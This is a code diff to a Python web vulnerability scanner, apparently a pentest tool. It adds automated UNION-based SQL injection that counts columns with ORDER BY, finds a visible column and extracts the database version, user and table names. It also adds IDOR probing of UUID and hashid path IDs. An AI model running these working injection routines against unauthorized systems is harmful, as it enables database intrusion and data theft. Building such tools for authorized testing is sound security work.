@@ -174,16 +174,63 @@ _UA_HEADERS = {"User-Agent": "Mozilla/5.0 (HAKUZA-Active/2.0; +differential-test
 # SQL error-vendor signatures (error-based SQLi, step 2)
 # ---------------------------------------------------------------------------
 _SQLI_ERROR_SIGNATURES = [
-    r"you have an error in your sql syntax",             # MySQL
-    r"warning: mysql_",                                    # MySQL/PHP
-    r"unclosed quotation mark after the character string", # MSSQL
-    r"microsoft ole db provider for sql server",           # MSSQL
-    r"quoted string not properly terminated",              # Oracle
-    r"ora-\d{5}",                                          # Oracle
-    r"postgresql.*error|pg_query\(\)|syntax error at or near",  # PostgreSQL
-    r"sqlite3?\.(operationalerror|error)|unrecognized token",   # SQLite
-    r"sqlstate\[\d+\]",                                    # generic PDO
+    (r"you have an error in your sql syntax", "mysql"),
+    (r"warning: mysql_", "mysql"),
+    (r"unclosed quotation mark after the character string", "mssql"),
+    (r"microsoft ole db provider for sql server", "mssql"),
+    (r"quoted string not properly terminated", "oracle"),
+    (r"ora-\d{5}", "oracle"),
+    (r"postgresql.*error|pg_query\(\)|syntax error at or near", "postgresql"),
+    (r"sqlite3?\.(operationalerror|error)|unrecognized token", "sqlite"),
+    (r"sqlstate\[\d+\]", None),  # generic PDO — vendor unknown, extraction not attempted
 ]
+
+# ---------------------------------------------------------------------------
+# UNION-based extraction — only attempted after error-based confirmation
+# tells us the exact vendor (boolean-blind alone isn't enough to safely guess
+# syntax). Turns "this parameter is injectable" into "here is the actual
+# extracted DB version / user / table names", which is the difference
+# between a scanner's say-so and a report a client can't argue with. Every
+# extraction query is a read-only SELECT — no vendor entry here ever writes.
+# MSSQL's table-enumeration story (no portable LIMIT/OFFSET across all
+# supported versions) is intentionally left unimplemented rather than
+# faked — version/db/user still extract fine for MSSQL.
+# ---------------------------------------------------------------------------
+_SQLI_VENDOR_SYNTAX = {
+    "mysql": {
+        "comment": "-- -",
+        "concat": lambda expr: f"CONCAT('HKZS',{expr},'HKZE')",
+        "version": "@@version", "current_db": "database()", "current_user": "current_user()",
+        "tables_query": lambda off: (
+            "SELECT table_name FROM information_schema.tables "
+            f"WHERE table_schema=database() LIMIT 1 OFFSET {off}"
+        ),
+    },
+    "postgresql": {
+        "comment": "-- -",
+        "concat": lambda expr: f"'HKZS'||{expr}||'HKZE'",
+        "version": "version()", "current_db": "current_database()", "current_user": "current_user",
+        "tables_query": lambda off: (
+            "SELECT table_name FROM information_schema.tables "
+            f"WHERE table_schema='public' LIMIT 1 OFFSET {off}"
+        ),
+    },
+    "sqlite": {
+        "comment": "-- -",
+        "concat": lambda expr: f"'HKZS'||{expr}||'HKZE'",
+        "version": "sqlite_version()", "current_db": "'main'", "current_user": "'n/a'",
+        "tables_query": lambda off: (
+            "SELECT name FROM sqlite_master WHERE type='table' "
+            f"LIMIT 1 OFFSET {off}"
+        ),
+    },
+    "mssql": {
+        "comment": "-- -",
+        "concat": lambda expr: f"'HKZS'+{expr}+'HKZE'",
+        "version": "@@version", "current_db": "DB_NAME()", "current_user": "SYSTEM_USER",
+        "tables_query": None,  # not implemented — no portable LIMIT/OFFSET across supported versions
+    },
+}
 
 # ---------------------------------------------------------------------------
 # NOTE on payload choices throughout this module: every payload below is
@@ -351,7 +398,8 @@ def _ai_escalate(ctx, vuln_class, param, url, payload, baseline_body, mutated_bo
 # ---------------------------------------------------------------------------
 
 def _persist(ctx, *, title, severity, category, url, param, payload, description,
-             baseline_snippet, mutated_snippet, impact, remediation, ai_reasoning=None):
+             baseline_snippet, mutated_snippet, impact, remediation, ai_reasoning=None,
+             extra_evidence=None):
     console = ctx.console
 
     evidence_parts = [
@@ -364,6 +412,8 @@ def _persist(ctx, *, title, severity, category, url, param, payload, description
         "--- Mutated response (context) ---",
         mutated_snippet,
     ]
+    if extra_evidence:
+        evidence_parts += ["", "--- Extracted data (UNION-based) ---", extra_evidence]
     if ai_reasoning:
         evidence_parts += ["", "--- AI escalation reasoning ---", ai_reasoning]
 
@@ -425,6 +475,204 @@ def _persist(ctx, *, title, severity, category, url, param, payload, description
                 console.print(f"  [yellow]Could not write PoC script: {_rich_escape(str(e))}[/yellow]")
 
     return finding
+
+
+# ---------------------------------------------------------------------------
+# UNION-based SQLi extraction — turns "confirmed injectable" into "here is
+# the actual extracted data". Only called after error-based confirmation has
+# already told us the exact vendor (see _SQLI_VENDOR_SYNTAX above). Every
+# request here is a read-only SELECT via UNION; nothing here ever writes.
+# ---------------------------------------------------------------------------
+
+_HKZ_MARK_RE = re.compile(r"HKZS(.*?)HKZE", re.S)
+# If the target ALSO reflects the raw request parameter elsewhere on the
+# page (common — reflected XSS and SQLi often coexist on the same
+# parameter, exactly like this project's own testlab/vulnerable_site.py),
+# the marker text appears TWICE: once verbatim as part of the unevaluated
+# injected SQL string, and once as the genuinely evaluated UNION result.
+# The first (raw) occurrence still contains leftover SQL syntax — quotes,
+# concat operators, parens — a real evaluated value (a version string, a
+# table name, a username) essentially never does. Filter on that rather
+# than assuming position in the page.
+_SQLISH_LEFTOVER_RE = re.compile(r"['|()+]")
+
+
+def _find_union_marker(text):
+    for m in _HKZ_MARK_RE.finditer(text or ""):
+        candidate = m.group(1).strip()
+        if not _SQLISH_LEFTOVER_RE.search(candidate):
+            return candidate
+    return None
+
+
+def _sqli_column_count(ctx, parts, pairs, pname, orig_value, comment, max_cols=10):
+    """ORDER BY N, incrementing until the response errors/changes relative
+    to a plain baseline of the same request with no ORDER BY at all. The
+    first N that breaks the query means the true column count is N-1.
+    Returns None if it can't be determined within max_cols (bounded cost —
+    extraction is skipped rather than guessing further)."""
+    budget, delay, timeout = ctx.budget, ctx.delay, ctx.timeout
+
+    ref_url = _build_url(parts, _with_param(pairs, pname, f"{orig_value}' {comment}"))
+    ref = _polite_get(budget, delay, ref_url, timeout)
+    if ref is None:
+        return None
+    ref_body = ref.text or ""
+    ref_len = len(ref_body)
+
+    for n in range(1, max_cols + 1):
+        if budget.exhausted():
+            return None
+        payload = f"{orig_value}' ORDER BY {n} {comment}"
+        url = _build_url(parts, _with_param(pairs, pname, payload))
+        resp = _polite_get(budget, delay, url, timeout)
+        if resp is None:
+            return None
+        body = resp.text or ""
+        # Same generic status/length differencing the error-based step
+        # already relies on — a bare regex match is not enough here, since
+        # the exact "ORDER BY out of range" wording varies by vendor/driver
+        # far more than a generic syntax-error message does (SQLite's, for
+        # example, is "does not match any column in the result set", which
+        # doesn't hit any of the vendor fingerprints above).
+        status_changed = resp.status_code != ref.status_code
+        len_changed = abs(len(body) - ref_len) > max(40, ref_len * 0.05)
+        sig_hit = any(re.search(pat, body, re.I) and not re.search(pat, ref_body, re.I)
+                     for pat, _v in _SQLI_ERROR_SIGNATURES)
+        if resp.status_code >= 500 or sig_hit or status_changed or len_changed:
+            return (n - 1) if n > 1 else None
+    return None  # more than max_cols columns — bail rather than keep guessing
+
+
+def _marker_evaluated(body, marker):
+    """True if `marker` appears in `body` somewhere NOT immediately
+    quote-bounded on both sides — i.e., not just the raw, unevaluated
+    'marker' SQL literal being reflected verbatim elsewhere on the page
+    (see _find_union_marker's docstring above for the full reasoning: a
+    genuinely evaluated string column renders as plain text, the syntax
+    quotes are consumed by SQL evaluation, not passed through to output)."""
+    for m in re.finditer(re.escape(marker), body):
+        before = body[m.start() - 1] if m.start() > 0 else ""
+        after = body[m.end()] if m.end() < len(body) else ""
+        if not (before == "'" and after == "'"):
+            return True
+    return False
+
+
+def _sqli_visible_column(ctx, parts, pairs, pname, orig_value, comment, col_count):
+    """Find a column position that reflects a string value into the visible
+    response. Tries an all-marker UNION first (1 request, works on
+    dynamically-typed backends like SQLite and permissive setups); falls
+    back to an all-NULL UNION with a linear per-column swap (bounded by
+    col_count, already capped at 10) for strict-typed backends that reject
+    a string in a numeric-typed column position."""
+    budget, delay, timeout = ctx.budget, ctx.delay, ctx.timeout
+
+    def _try(cols):
+        payload = f"{orig_value}' UNION SELECT {','.join(cols)} {comment}"
+        url = _build_url(parts, _with_param(pairs, pname, payload))
+        resp = _polite_get(budget, delay, url, timeout)
+        if resp is None:
+            return None
+        return resp.text or ""
+
+    marker_cols = [f"'HKZUC{i}'" for i in range(col_count)]
+    body = _try(marker_cols)
+    if body:
+        for i in range(col_count):
+            if _marker_evaluated(body, f"HKZUC{i}"):
+                return i
+
+    if budget.exhausted():
+        return None
+    null_cols = ["NULL"] * col_count
+    if _try(null_cols) is None:
+        return None  # UNION with all-NULL still fails — not exploitable this way
+
+    for i in range(col_count):
+        if budget.exhausted():
+            return None
+        trial = list(null_cols)
+        trial[i] = f"'HKZUC{i}'"
+        body = _try(trial)
+        if body and _marker_evaluated(body, f"HKZUC{i}"):
+            return i
+    return None
+
+
+def _sqli_extract_value(ctx, parts, pairs, pname, orig_value, comment, col_count, vis_idx,
+                        expr, concat_fn):
+    budget, delay, timeout = ctx.budget, ctx.delay, ctx.timeout
+    if budget.exhausted():
+        return None
+    cols = ["NULL"] * col_count
+    cols[vis_idx] = concat_fn(expr)
+    payload = f"{orig_value}' UNION SELECT {','.join(cols)} {comment}"
+    url = _build_url(parts, _with_param(pairs, pname, payload))
+    resp = _polite_get(budget, delay, url, timeout)
+    if resp is None:
+        return None
+    return _find_union_marker(resp.text or "")
+
+
+def _attempt_sqli_extraction(ctx, parts, pairs, pname, orig_value, vendor):
+    """Best-effort UNION-based extraction. Returns a human-readable evidence
+    string on success, or None on any failure/inconclusive step — extraction
+    is a bonus on top of an already-confirmed finding, so it fails quietly
+    rather than ever blocking or degrading the base finding."""
+    syntax = _SQLI_VENDOR_SYNTAX.get(vendor)
+    if not syntax:
+        return None
+
+    comment = syntax["comment"]
+    concat_fn = syntax["concat"]
+    col_count = _sqli_column_count(ctx, parts, pairs, pname, orig_value, comment)
+    if not col_count or ctx.budget.exhausted():
+        return None
+
+    vis_idx = _sqli_visible_column(ctx, parts, pairs, pname, orig_value, comment, col_count)
+    if vis_idx is None or ctx.budget.exhausted():
+        return None
+
+    lines = [f"Vendor: {vendor}  |  Columns: {col_count}  |  Visible column index: {vis_idx}"]
+
+    version = _sqli_extract_value(ctx, parts, pairs, pname, orig_value, comment,
+                                   col_count, vis_idx, syntax["version"], concat_fn)
+    if version:
+        lines.append(f"Version: {version}")
+
+    if not ctx.budget.exhausted():
+        current_db = _sqli_extract_value(ctx, parts, pairs, pname, orig_value, comment,
+                                         col_count, vis_idx, syntax["current_db"], concat_fn)
+        if current_db:
+            lines.append(f"Current database: {current_db}")
+
+    if not ctx.budget.exhausted():
+        current_user = _sqli_extract_value(ctx, parts, pairs, pname, orig_value, comment,
+                                           col_count, vis_idx, syntax["current_user"], concat_fn)
+        if current_user:
+            lines.append(f"Current DB user: {current_user}")
+
+    tables_fn = syntax.get("tables_query")
+    if tables_fn:
+        tables = []
+        for offset in range(5):
+            if ctx.budget.exhausted():
+                break
+            t = _sqli_extract_value(ctx, parts, pairs, pname, orig_value, comment,
+                                    col_count, vis_idx, f"({tables_fn(offset)})", concat_fn)
+            if not t:
+                break
+            tables.append(t)
+        if tables:
+            lines.append(f"Tables (first {len(tables)}): {', '.join(tables)}")
+    else:
+        lines.append("Table enumeration: not attempted (no portable syntax for this vendor in v1)")
+
+    if len(lines) <= 1:
+        return None  # nothing beyond the header extracted — don't claim a hollow win
+    ctx.console.print(f"  [dim]UNION extraction ({vendor}): {len(lines)-1} value(s) pulled[/dim]")
+    return "\n".join(lines)
 
 
 # ---------------------------------------------------------------------------
@@ -498,28 +746,41 @@ def _test_param(ctx, parts, pairs, pname, baseline):
     resp_e = _polite_get(budget, delay, url_e, timeout)
     if resp_e is not None:
         body_e = resp_e.text or ""
-        sig_hit, matched_text = None, ""
-        for pat in _SQLI_ERROR_SIGNATURES:
+        sig_hit, matched_text, vendor = None, "", None
+        for pat, pat_vendor in _SQLI_ERROR_SIGNATURES:
             mm = re.search(pat, body_e, re.I)
             if mm and not re.search(pat, baseline["body"], re.I):
-                sig_hit, matched_text = pat, mm.group(0)
+                sig_hit, matched_text, vendor = pat, mm.group(0), pat_vendor
                 break
         status_changed = resp_e.status_code != baseline["status"]
         len_changed = abs(len(body_e) - baseline["length"]) > max(40, baseline["length"] * 0.05)
         if sig_hit and (status_changed or len_changed):
             sqli_confirmed = True
+
+            extraction = None
+            if ctx.depth == "deep" and vendor and not budget.exhausted():
+                extraction = _attempt_sqli_extraction(ctx, parts, pairs, pname, orig_value, vendor)
+
+            description = (
+                f"Appending a single quote to the '{pname}' parameter produced a database "
+                f"error signature ('{matched_text[:80]}') absent from 3 repeated baseline "
+                f"requests (baseline status {baseline['status']}, length {baseline['length']}) "
+                f"vs. the mutated response (status {resp_e.status_code}, length {len(body_e)})."
+            )
+            if extraction:
+                description += (
+                    f"\n\nData was successfully extracted via UNION-based injection to prove "
+                    f"real impact, not just a signature match — see the extraction summary in "
+                    f"this finding's evidence."
+                )
+
             _persist(
                 ctx,
                 title=f"SQL Injection (error-based) via '{pname}' parameter",
                 severity="critical",
                 category="SQL Injection (Error-based)",
                 url=url_e, param=pname, payload=err_payload,
-                description=(
-                    f"Appending a single quote to the '{pname}' parameter produced a database "
-                    f"error signature ('{matched_text[:80]}') absent from 3 repeated baseline "
-                    f"requests (baseline status {baseline['status']}, length {baseline['length']}) "
-                    f"vs. the mutated response (status {resp_e.status_code}, length {len(body_e)})."
-                ),
+                description=description,
                 baseline_snippet=_ctx_snippet(baseline["body"], ""),
                 mutated_snippet=_ctx_snippet(body_e, matched_text),
                 impact=("Full database compromise is likely — read/write access to underlying "
@@ -528,6 +789,7 @@ def _test_param(ctx, parts, pairs, pname, baseline):
                 remediation=("Use parameterized queries / prepared statements exclusively. Never "
                             "concatenate user input into SQL strings. Apply least-privilege DB "
                             "accounts and disable verbose DB error output in production."),
+                extra_evidence=extraction,
             )
 
     if budget.exhausted():
@@ -926,78 +1188,178 @@ def _idor_diff_signal(baseline_body, mutated_body):
     return True, ratio, changed_text[:300]
 
 
+_UUID_RE = re.compile(
+    r"([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})", re.I
+)
+
+
+def _detect_path_id(path):
+    """Find the first ID-shaped path segment and classify it. Checked in
+    specificity order — a UUID also happens to satisfy the looser hashid
+    pattern below, so it must be tried first. Returns (match, kind) with
+    kind in {"numeric", "uuid", "hashid"}, or (None, None)."""
+    m = re.search(r"/(\d+)(?:/|$)", path)
+    if m:
+        return m, "numeric"
+    m = _UUID_RE.search(path)
+    if m:
+        return m, "uuid"
+    # Opaque-ID heuristic (Hashids-style output, base62 tokens, etc.): a
+    # full path SEGMENT, alnum/dash/underscore, 6-24 chars, with at least
+    # one digit AND one letter so ordinary path words ("products",
+    # "profile") don't false-match.
+    for seg in re.finditer(r"/([A-Za-z0-9_-]{6,24})(?:/|$)", path):
+        val = seg.group(1)
+        if any(c.isdigit() for c in val) and any(c.isalpha() for c in val):
+            return seg, "hashid"
+    return None, None
+
+
+def _find_sibling_ids(ctx, parts, id_start, id_end, orig_id):
+    """For UUID/hashid-shaped IDs, blindly guessing a neighbor is futile —
+    a UUIDv4 is 122 bits of randomness, there is no "id + 1000". Instead,
+    cross-reference OTHER URLs already discovered in this engagement's own
+    recon data (wayback_urls / urls) that share the exact same path
+    template (identical prefix/suffix, only the ID position differs).
+    Testing a real ID a crawl already found is far more likely to hit a
+    genuine record than any generated guess."""
+    prefix, suffix = parts.path[:id_start], parts.path[id_end:]
+    template_re = re.compile(r"^" + re.escape(prefix) + r"([^/]+)" + re.escape(suffix) + r"$")
+
+    candidates = []
+    seen = set()
+    for dtype in ("wayback_urls", "urls"):
+        try:
+            entries = _get_latest_recon(ctx.eng_id, dtype, limit=1)
+        except Exception:
+            entries = []
+        for entry in entries:
+            for line in (entry.get("content") or "").splitlines():
+                line = line.strip()
+                if not line:
+                    continue
+                try:
+                    other = urlsplit(line)
+                except ValueError:
+                    continue
+                if other.netloc != parts.netloc:
+                    continue
+                mm = template_re.match(other.path)
+                if mm and mm.group(1) != orig_id and mm.group(1) not in seen:
+                    seen.add(mm.group(1))
+                    candidates.append(mm.group(1))
+                    if len(candidates) >= 5:  # bounded — don't test unlimited siblings
+                        return candidates
+    return candidates
+
+
+def _idor_try_variant(ctx, baseline, orig_id_str, variant, new_url, source_note):
+    """Request one alternate-ID URL (already built by the caller — path
+    substitution differs slightly between the numeric and UUID/hashid
+    cases), diff it against the baseline, and persist a finding if it
+    signals a real IDOR. Shared by both callers below; only the
+    description's framing of *how the alternate ID was obtained*
+    (source_note) differs between them. Returns True if a finding was
+    persisted (caller stops after the first hit — one lead is enough)."""
+    resp = _polite_get(ctx.budget, ctx.delay, new_url, ctx.timeout)
+    if resp is None or resp.status_code != 200:
+        return False
+
+    is_signal, ratio, changed_sample = _idor_diff_signal(baseline["body"], resp.text or "")
+    if not is_signal:
+        return False
+
+    same_template = ratio > 0.85
+    ai_result = None
+    if ctx.ai_enabled:
+        ai_result = _ai_escalate(ctx, "IDOR (heuristic)", "path-id", new_url, variant,
+                                 baseline["body"], resp.text or "")
+    reasoning = ai_result.get("reasoning") if ai_result else None
+
+    shape_desc = (
+        f"using what looks like the SAME page template as the baseline (similarity ratio "
+        f"{ratio:.2f}) but with genuinely different content in place — e.g. "
+        f"\"{changed_sample[:150]}\" — consistent with a different underlying record (a "
+        f"different user/order/record's data) being returned rather than an access-denied "
+        f"page. This is the most common real-world IDOR shape: a well-built page's template "
+        f"stays identical, only the record's own fields change."
+        if same_template else
+        f"with meaningfully different content from the baseline (similarity ratio {ratio:.2f}) "
+        f"rather than an error/not-found page — e.g. \"{changed_sample[:150]}\"."
+    )
+
+    _persist(
+        ctx,
+        title=(f"Potential IDOR (heuristic) on path ID {orig_id_str} — confirm manually "
+              f"with two distinct authenticated sessions"),
+        severity="medium",
+        category="Insecure Direct Object Reference (heuristic)",
+        url=new_url, param="path-id", payload=variant,
+        description=(
+            f"{source_note} A 200 OK response was returned {shape_desc} This is an "
+            "intentionally single-session heuristic — HAKUZA v1 cannot yet drive two distinct "
+            "authenticated sessions, so this is a LEAD, not a confirmed IDOR. Confirm manually "
+            "with two distinct authenticated user sessions before reporting this as a finding."
+        ),
+        baseline_snippet=_ctx_snippet(baseline["body"], ""),
+        mutated_snippet=_ctx_snippet(resp.text or "", ""),
+        impact=("If confirmed with two authenticated sessions, this would allow horizontal "
+               "privilege escalation — any authenticated user could access another user's "
+               "records by supplying a different ID."),
+        remediation=("Enforce object-level authorization checks server-side on every request "
+                    "— verify the requesting session actually owns the requested resource; "
+                    "never trust client-supplied IDs alone."),
+        ai_reasoning=reasoning,
+    )
+    return True
+
+
 def _test_idor_heuristic(ctx, parts, baseline):
-    m = re.search(r"/(\d+)(?:/|$)", parts.path)
-    if not m:
+    m, kind = _detect_path_id(parts.path)
+    if m is None:
         return
     budget = ctx.budget
     orig_id_str = m.group(1)
-    try:
+
+    if kind == "numeric":
         orig_id = int(orig_id_str)
-    except ValueError:
-        return
+        variants = []
+        if orig_id - 1 >= 0:
+            variants.append(str(orig_id - 1))
+        variants.append(str(orig_id + 1000))
 
-    variants = []
-    if orig_id - 1 >= 0:
-        variants.append(str(orig_id - 1))
-    variants.append(str(orig_id + 1000))
+        for variant in variants:
+            if variant == orig_id_str or budget.exhausted():
+                continue
+            new_path = parts.path[:m.start(1)] + variant + parts.path[m.end(1):]
+            new_url = urlunsplit((parts.scheme, parts.netloc, new_path, parts.query, parts.fragment))
+            source_note = f"Changing the numeric path segment from {orig_id_str} to {variant}."
+            if _idor_try_variant(ctx, baseline, orig_id_str, variant, new_url, source_note):
+                return  # one lead per target is enough signal
 
-    for variant in variants:
-        if variant == orig_id_str or budget.exhausted():
-            continue
-        new_path = parts.path[:m.start(1)] + variant + parts.path[m.end(1):]
-        new_url = urlunsplit((parts.scheme, parts.netloc, new_path, parts.query, parts.fragment))
-        resp = _polite_get(budget, ctx.delay, new_url, ctx.timeout)
-        if resp is None or resp.status_code != 200:
-            continue
-
-        is_signal, ratio, changed_sample = _idor_diff_signal(baseline["body"], resp.text or "")
-        if is_signal:
-            same_template = ratio > 0.85
-            ai_result = None
-            if ctx.ai_enabled:
-                ai_result = _ai_escalate(ctx, "IDOR (heuristic)", "path-id", new_url, variant,
-                                         baseline["body"], resp.text or "")
-            reasoning = ai_result.get("reasoning") if ai_result else None
-            _persist(
-                ctx,
-                title=(f"Potential IDOR (heuristic) on path ID {orig_id_str} — confirm manually "
-                      f"with two distinct authenticated sessions"),
-                severity="medium",
-                category="Insecure Direct Object Reference (heuristic)",
-                url=new_url, param="path-id", payload=variant,
-                description=(
-                    (
-                        f"Changing the numeric path segment from {orig_id_str} to {variant} returned "
-                        f"a 200 OK response using what looks like the SAME page template as the "
-                        f"baseline (similarity ratio {ratio:.2f}) but with genuinely different "
-                        f"content in place — e.g. \"{changed_sample[:150]}\" — consistent with a "
-                        f"different underlying record (a different user/order/record's data) being "
-                        f"returned rather than an access-denied page. This is the most common "
-                        f"real-world IDOR shape: a well-built page's template stays identical, only "
-                        f"the record's own fields change."
-                        if same_template else
-                        f"Changing the numeric path segment from {orig_id_str} to {variant} returned "
-                        f"a 200 OK response with meaningfully different content from the baseline "
-                        f"(similarity ratio {ratio:.2f}) rather than an error/not-found page — e.g. "
-                        f"\"{changed_sample[:150]}\"."
-                    ) +
-                    " This is an intentionally single-session heuristic — HAKUZA v1 cannot yet drive "
-                    "two distinct authenticated sessions, so this is a LEAD, not a confirmed IDOR. "
-                    "Confirm manually with two distinct authenticated user sessions before reporting "
-                    "this as a finding."
-                ),
-                baseline_snippet=_ctx_snippet(baseline["body"], ""),
-                mutated_snippet=_ctx_snippet(resp.text or "", ""),
-                impact=("If confirmed with two authenticated sessions, this would allow "
-                       "horizontal privilege escalation — any authenticated user could access "
-                       "another user's records by incrementing an ID."),
-                remediation=("Enforce object-level authorization checks server-side on every "
-                            "request — verify the requesting session actually owns the requested "
-                            "resource; never trust client-supplied IDs alone."),
-                ai_reasoning=reasoning,
+    else:  # uuid / hashid — guessing is futile, use real sibling IDs from recon data
+        siblings = _find_sibling_ids(ctx, parts, m.start(1), m.end(1), orig_id_str)
+        if not siblings:
+            ctx.console.print(
+                f"  [dim]path ID looks like a {kind} ({_rich_escape(orig_id_str)}) — no "
+                f"sibling values found in this engagement's recon data to cross-reference, "
+                f"skipping (guessing a {kind} is not viable).[/dim]"
             )
-            return  # one lead per target is enough signal
+            return
+
+        label = "UUID" if kind == "uuid" else "hashid"
+        for variant in siblings:
+            if budget.exhausted():
+                return
+            new_path = parts.path[:m.start(1)] + variant + parts.path[m.end(1):]
+            new_url = urlunsplit((parts.scheme, parts.netloc, new_path, parts.query, parts.fragment))
+            source_note = (
+                f"Requesting a different {label} ({variant}) discovered elsewhere in this "
+                f"engagement's own recon data (same URL template, different ID — not a guess) "
+                f"in place of {orig_id_str}."
+            )
+            if _idor_try_variant(ctx, baseline, orig_id_str, variant, new_url, source_note):
+                return  # one lead per target is enough signal
 
 
 # ---------------------------------------------------------------------------
